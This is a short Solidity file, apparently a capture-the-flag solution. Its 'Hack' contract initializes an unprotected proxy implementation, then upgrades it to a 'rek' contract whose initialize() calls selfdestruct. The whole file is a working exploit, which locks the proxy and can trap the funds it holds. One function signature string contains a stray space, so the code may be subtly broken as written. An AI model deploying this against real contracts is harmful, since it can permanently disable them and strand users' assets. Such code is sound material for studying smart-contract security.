// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface target {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external;
}

contract Hack {
    address logic;
    bool public result;

    constructor(address _logic) public{
        logic = _logic;
    }
    
    
    function  callinitialize() public {
        (bool success, ) = logic.call(abi.encodeWithSignature('initialize()'));
        require(success, 'initalize call failed');
    }

    function setmaliciousImp() public returns(bool){
        rek haxor = new rek();
        (bool success, ) = logic.call(abi.encodeWithSignature("upgradeToAndCall(address, bytes)",
         address(haxor),
         abi.encodeWithSignature('initialize()')
         ));
        require(success, "hack call failed");
        return Address.isContract(logic);
    }

}

contract rek {
    function initialize() external {
        selfdestruct(msg.sender);
    }
}